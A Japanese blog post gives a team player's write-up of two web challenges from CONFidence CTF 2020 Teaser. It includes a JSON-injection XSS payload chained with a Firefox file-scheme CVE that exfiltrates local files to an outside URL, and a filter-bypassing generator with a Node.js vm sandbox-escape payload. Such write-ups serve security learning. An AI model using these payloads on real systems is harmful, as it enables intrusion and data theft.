---
layout: post
title: CONFidence CTF 2020 Teaser の write-up
categories: [ctf]
date: 2020-03-15 20:00:00 +0900
---

3 月 14 日から 3 月 15 日にかけて開催された [CONFidence CTF 2020 Teaser](https://confidence2020.p4.team/) に、チーム zer0pts として参加しました。最終的にチームで 786 点を獲得し、順位は 9 点以上得点した 354 チーム中 19 位でした。うち、私は 2 問を解いて 319 点を入れました。

以下、私が解いた問題の write-up です。

## [Web 157] Cat web (24 solves)
> HAI! WANNA SEE MAI KATZ? OR MAYBE YOU WANNA SEE SOM FLAG?
> 
> (URL)
> 
> Note: Getting the flags location is a part of the challenge. You don't have to guess it.

与えられた URL にアクセスすると、以下のような HTML が返ってきました。

```html
<html>
	<head>
		<title>My cats</title>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script>
		function getNewCats(kind) {
			$.getJSON('http://catweb.zajebistyc.tf/cats?kind='+kind, function(data) {
				if(data.status != 'ok')
				{
					return;
				}
				$('#cats_container').empty();
				cats = data.content;
				cats.forEach(function(cat) {
					var newDiv = document.createElement('div');
					newDiv.innerHTML = '<img style="max-width: 200px; max-height: 200px" src="static/'+kind+'/'+cat+'" />';
					$('#cats_container').append(newDiv);
				});
			});
		}
		$(document).ready(function() {
			$('#cat_select').change(function() {
				var kind = $(this).val();
				history.pushState({}, '', '?'+kind)
				getNewCats(kind);
			});
			var kind = window.location.search.substring(1);
			if(kind == "")
			{
				kind = 'black';
			}
			getNewCats(kind);
		});
	</script>
	</head>
	<body>
		<select id="cat_select">
			<option value="black">black</option>
			<option value="grey">grey</option>
			<option value="red">red</option>
			<option value="white">white</option>
		</select>
		<div id="cats_container"></div>
		not like sumthing? send it <a href="/report">hier</a>
	</body>
</html>
```

セレクトボックスから色を選択すると `/cats?kind=(選択した色)` という感じで API を叩き、返ってきた JSON に含まれるパスを画像として表示するアプリケーションのようです。なお、`newDiv.innerHTML = '<img style="max-width: 200px; max-height: 200px" src="static/'+kind+'/'+cat+'" />';` とその色とパスをそのまま HTML に結合した上で `innerHTML` に設定しており、XSS ができそうです。

### XSS したい

`/cats` が XSS に使えないか調べてみましょう。`/cats?kind=red` にアクセスすると以下のような JSON が返ってきました。

```json
{"status": "ok", "content": ["69aa998e638d6ab2f22a7e2b273f59da.jpg", "unnamed.jpg", "cats-32.jpg", "ryizhiy-kotenok1.jpg", "e4dc63465b454a8f1df7c28bfcec9c65.jpg"]}
```

`/cats?kind=neko` にアクセスすると以下のような JSON が返ってきました。

```json
{"status": "error", "content": "neko could not be found"}
```

`/cats?kind=%22` にアクセスすると以下のような JSON (?) が返ってきました。

```json
{"status": "error", "content": "" could not be found"}
```

`"` がエスケープされておらず、JSON の構造を破壊することができそうです。先程のページで `innerHTML` 経由の XSS ができる条件として `data.status != 'ok'` があるので、`status` プロパティを `ok` にした上で `content` プロパティも置き換えてしまいましょう。

`/cats?kind=",%20"status":%20"ok",%20"content":%20["abc\u0022%20onerror\u003d\u0022alert(123)"],%20"a":%20"` にアクセスすると以下のような JSON が返ってきました。

```json
{"status": "error", "content": "", "status": "ok", "content": ["abc\u0022 onerror\u003d\u0022alert(123)"], "a": " could not be found"}
```

`/?",%20"status":%20"ok",%20"content":%20["abc\u0022%20onerror\u003d\u0022alert(123)"],%20"a":%20"` にアクセスするとアラートが表示されました。

### フラグはどこですか

`/report` からは URL を admin に報告できます。ところが、`fetch` で `/flag` や `/admin` のようなコンテンツを取得して適当な URL に投げさせてみてもどれも 404、`document.cookie` や `document.referer` も空とフラグの場所がわかりません。

ここで試しに RequestBin で生成した URL を投げてみたところ、`Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0` という User-Agent のブラウザからアクセスが来ました。どうやら問題サーバと同じオリジンでなくてもアクセスしてくれるようです。

まさかと思い `javascript:location="(URL)"` を投げてみたところ、こちらでもちゃんと指定した URL にアクセスが来ました。スキームのチェックは全く行われていないようです。

ここで悩んでいたところ、aventador さんが [CVE-2019-11730](https://quitten.github.io/Firefox/) という脆弱性を紹介してくれました。これはそのページが `file` スキームであればローカルにあるファイルを読み出せるという脆弱性のようです。

`/cats` へのリクエスト部分では `$.getJSON('http://catweb.zajebistyc.tf/cats?kind='+kind)` と URL 部分が丁寧にも相対パスではないため、`file` スキームであっても相変わらず XSS が可能です。`file:///app/templates/index.html?(ペイロード)` にアクセスさせれば CVE-2019-11730 を利用してローカルにあるファイルの内容を読み出させることができそうです。

[alidnf/CVE-2019-11730](https://github.com/alidnf/CVE-2019-11730) を参考に、試しに `file:///app/templates/index.html?",%20"status":%20"ok",%20"content":%20["abc\u0022%20onerror\u003d\u0022var%20i%3Ddocument.createElement('iframe')%3Bi.src%3D'.%2F'%3Bi.onload%3Dfunction()%7B(new%20Image).src%3D'http%3A%2F%2F(省略)%3F'%2Bi.contentDocument.body.innerText%7D%3Bdocument.body.append(i)"],%20"a":%20"` を投げてみると以下のようなリクエストが来ました。

```
GET /r/1eysizb1?Indeks file:///app/templates/Do katalogu wyższego poziomuNazwaRozmiarOstatnia modyfikacjaflag.txt1 KB13.03.202017:41:14 UTCindex.html2 KB13.03.202022:21:34 UTCreport.html1 KB13.03.202017:41:14 UTC=
```

おっ、`flag.txt` があるようです。`file:///app/templates/index.html?",%20"status":%20"ok",%20"content":%20["abc\u0022%20onerror\u003d\u0022var%20i%3Ddocument.createElement('iframe')%3Bi.src%3D'.%2Fflag.txt'%3Bi.onload%3Dfunction()%7B(new%20Image).src%3D'http%3A%2F%2F(省略)%3F'%2Bi.contentDocument.body.innerText%7D%3Bdocument.body.append(i)"],%20"a":%20"` でフラグが得られました。

```
p4{can_i_haz_a_piece_of_flag_pliz?}
```

## [Web 162] Temple JS (23 solves)
> ECMAScript 6 brought in a new paradigm to JavaScript: template programming!!111 ... kinda
> 
> Do you want to try? :)
> 
> (URL)

この問題は zer0pts が first solve でした。

与えられた URL にアクセスすると、`Type 'source' to reveal the truth...` というメッセージとともに REPL が表示されました。とりあえず `source` と打ってみるとサーバのソースが表示されました。

```javascript
const express = require("express")
const fs = require("fs")
const vm = require("vm")
const watchdog = require("./watchdog");

global.flag = fs.readFileSync("flag").toString()
const source = fs.readFileSync(__filename).toString()
const help = "There is no help on the way."

const app = express()
const port = 3000

app.use(express.json())
app.use('/', express.static('public'))

app.post('/repl', (req, res) => {
    let sandbox = vm.createContext({par: (v => `(${v})`), source, help})
    let validInput = /^[a-zA-Z0-9 ${}`]+$/g
    
    let command = req.body['cmd']
    
    console.log(`${req.ip}> ${command}`)

    let response;

    try {
        if(validInput.test(command))
        {    
            let watch = watchdog.schedule()
            try {
                response = vm.runInContext(command, sandbox, {
                    timeout: 300,
                    displayErrors: false
                });
            } finally {
                watchdog.stop(watch)
            }
        } else
            throw new Error("Invalid input.")
    } catch(ex)
    {
        response = ex.toString()
    }

    console.log(`${req.ip}< ${response}`)
    res.send(JSON.stringify({"response": response}))
})

console.log(`Listening on :${port}...`)
app.listen(port, '0.0.0.0')
```

`validInput` の範囲内で任意のコードが実行でき、`global.flag` を読み出すことができれば勝ちのようです。英数字に加えて半角スペースとバックティック、`$` `{` `}` しか使えないとなると厳しそうですが、頑張りましょう。

`$` `{` `}` という記号から思い出される JavaScript の機能といえば、ECMAScript 2015 で追加された[テンプレート文字列](https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/template_strings)です。これは以下のようにバックティックで囲むことで文字列中に式を実行してその結果を埋め込むことができる機能です。

```javascript
`a${7*7}b` // => a49b
```

なお、バックティックの前に関数を置くと、その関数が以下のような引数とともに呼び出されます。

```javascript
function f(...args) {
  console.log(JSON.stringify(args));
}

f`a${7*7}b${1+2}c` // ([["a","b","c"],49,3] が console.log で出力される)
((...args)=>{console.log(JSON.stringify(args))})`a${7*7}b${1+2}c` // ([["a","b","c"],49,3] が console.log で出力される)
```

これを利用して好きなコードを実行できるよう頑張っていきましょう。具体的には `eval(String.fromCharCode(...))` に相当するコードを作り出しましょう。

### String.fromCharCode を作りたい

`String.fromCharCode` にアクセスするには `String.fromCharCode` や `String['fromCharCode']` のような方法がありますが、いずれも `validInput` では許可されていない文字が含まれているためそのままでは使えません。適当な関数で `.` を作り、何らかの方法で文字列を結合して `String.fromCharCode` という文字列を作り、`eval('String.fromCharCode')` で関数そのものを手に入れましょう。ただ、以下のようなコードで一見いけそうに見えますが、

```javascript
eval`String${atob`Lg`}fromCharCode`
```

これは `eval(["String","fromCharCode"],".")` に相当し、`eval` は第一引数のみを実行するためうまくいきません。これに対し、[`Function`](https://developer.mozilla.org/ja/docs/Web/JavaScript/Guide/Obsolete_Pages/Predefined_Core_Objects/Function_Object) は最後の引数を関数の本体とし、それ以外の引数についてはその関数の仮引数名として解釈します。以下のようなコードは、

```javascript
Function`a${`return String${atob`Lg`}fromCharCode`}`
```

`Function(["a",""],"return String.fromCharCode")` に相当し、これは `function (a) { return String.fromCharCode }` のような関数になります。しかしながら Node.js にはデフォルトでは `atob` (Base64 デコードする関数) がありません。別の方法で `.` を作りましょう。

ソースコードを眺めていると、sandbox から参照できる変数として、呼び出すと引数を `(` `)` で囲った文字列を返す `par` という関数と、`"There is no help on the way."` という文字列が入っている `help` があることがわかりました。`help` には `.` が含まれていますから、これを切り出すのが楽でしょう。

文字列の一部を切り出す方法として `help.substr(x, y)` や `help.charAt(x)`、あるいは `help[x]` のような方法が考えられますが、やはりいずれも `validInput` では許可されていない文字が含まれています。ただ、`par` 関数によって `(` `)` については作ることができますから、これを利用できないでしょうか。

JavaScript には `with` 文というあまり知られていない構文があり、以下のように `.` や `[` `]` を使わずともそのオブジェクトのプロパティにアクセスすることができます。

```javascript
with (console) log('test'); // test が console.log で出力される
```

これを利用して、以下のような `help.charAt(27)` に相当するコードで `.` を作り出すことができました。

```javascript
Function`a${`with ${`${par`help`}`} return charAt${par`27`}`}```
```

先程のコードの `atob` を呼び出している部分をこれに置き換えることで、`String.fromCharCode` を取得することができました。

```javascript
Function`a${`return String${Function`a${`with ${`${par`help`}`} return charAt${par`27`}`}```}fromCharCode`}```
```

ちゃんと動いているか確認しましょう。`String.fromCharCode(65, 66, 67)` に相当するコードを作り、実行するとちゃんと `ABC` と出力されました。やった!

```javascript
Function`a${`return String${Function`a${`with ${`${par`help`}`} return charAt${par`27`}`}```}fromCharCode${par`65${1}66${1}67`}`}```
```

ここまでのまとめとして、好きなコードを実行できるように `eval(String.fromCharCode(...))` に相当するコードを出力するスクリプトを書きましょう。

```python
template = '''
Function`a${Function`a${`return String${Function`a${`with ${`${par`help`}`} return charAt${par`27`}`}```}fromCharCode${par`XXXXX`}`}```}```
'''.strip()
payload = '''
return 7*7
'''.strip()
print(template.replace('XXXXX', '${1}'.join(str(ord(c)) for c in payload)))
```

### global.flag を手に入れたい

`validInput` の制限を無視できるようにはなりましたが、残念ながらこれらのコードは `vm.runInContext` によって制限された環境の中で実行されているため、最初に定義されている `global.flag` にはアクセスすることができません。抜け出せないでしょうか。

`node.js vm escape` でググってみると、[Escaping nodejs vm](https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af) という Gist がヒットしました。上から見ていくと、[`code5`](https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af#file-escape-js-L120-L128) が `Proxy` を例外として投げるもので、このアプリの `try { response = vm.runInContext(…); … } catch (ex) { response = ex.toString() }` という例外の処理方法から考えても使えそうです。

最終的に、先程のスクリプトの `payload` を以下のようなコードに置き換え、実行して出力されたものを投げるとフラグが得られました。

```javascript
throw new Proxy({}, {
  get: function(me, key) {
    const cc = arguments.callee.caller;
    if (cc != null) {
      var res = (cc.constructor.constructor('return flag'))();
    }
    return function () {
      return res;
    };
  }
})
```

```
$ python gen.py
Function`a${Function`a${`return String${Function`a${`with ${`${par`help`}`} return charAt${par`27`}`}```}fromCharCode${par`116${1}104${1}114${1}111${1}119${1}32${1}110${1}101${1}119${1}32${1}80${1}114${1}111${1}120${1}121${1}40${1}123${1}125${1}44${1}32${1}123${1}10${1}32${1}32${1}103${1}101${1}116${1}58${1}32${1}102${1}117${1}110${1}99${1}116${1}105${1}111${1}110${1}40${1}109${1}101${1}44${1}32${1}107${1}101${1}121${1}41${1}32${1}123${1}10${1}32${1}32${1}32${1}32${1}99${1}111${1}110${1}115${1}116${1}32${1}99${1}99${1}32${1}61${1}32${1}97${1}114${1}103${1}117${1}109${1}101${1}110${1}116${1}115${1}46${1}99${1}97${1}108${1}108${1}101${1}101${1}46${1}99${1}97${1}108${1}108${1}101${1}114${1}59${1}10${1}32${1}32${1}32${1}32${1}105${1}102${1}32${1}40${1}99${1}99${1}32${1}33${1}61${1}32${1}110${1}117${1}108${1}108${1}41${1}32${1}123${1}10${1}32${1}32${1}32${1}32${1}32${1}32${1}118${1}97${1}114${1}32${1}114${1}101${1}115${1}32${1}61${1}32${1}40${1}99${1}99${1}46${1}99${1}111${1}110${1}115${1}116${1}114${1}117${1}99${1}116${1}111${1}114${1}46${1}99${1}111${1}110${1}115${1}116${1}114${1}117${1}99${1}116${1}111${1}114${1}40${1}39${1}114${1}101${1}116${1}117${1}114${1}110${1}32${1}102${1}108${1}97${1}103${1}39${1}41${1}41${1}40${1}41${1}59${1}10${1}32${1}32${1}32${1}32${1}125${1}10${1}32${1}32${1}32${1}32${1}114${1}101${1}116${1}117${1}114${1}110${1}32${1}102${1}117${1}110${1}99${1}116${1}105${1}111${1}110${1}32${1}40${1}41${1}32${1}123${1}32${1}114${1}101${1}116${1}117${1}114${1}110${1}32${1}114${1}101${1}115${1}59${1}32${1}125${1}59${1}10${1}32${1}32${1}125${1}10${1}125${1}41`}`}```}```
$ curl https://(省略)/repl -H "Content-Type: application/json" -d '{"cmd":"(省略)"}'
{"response":"p4{js_template_strings_are_so_functional}"}
```

```
p4{js_template_strings_are_so_functional}
```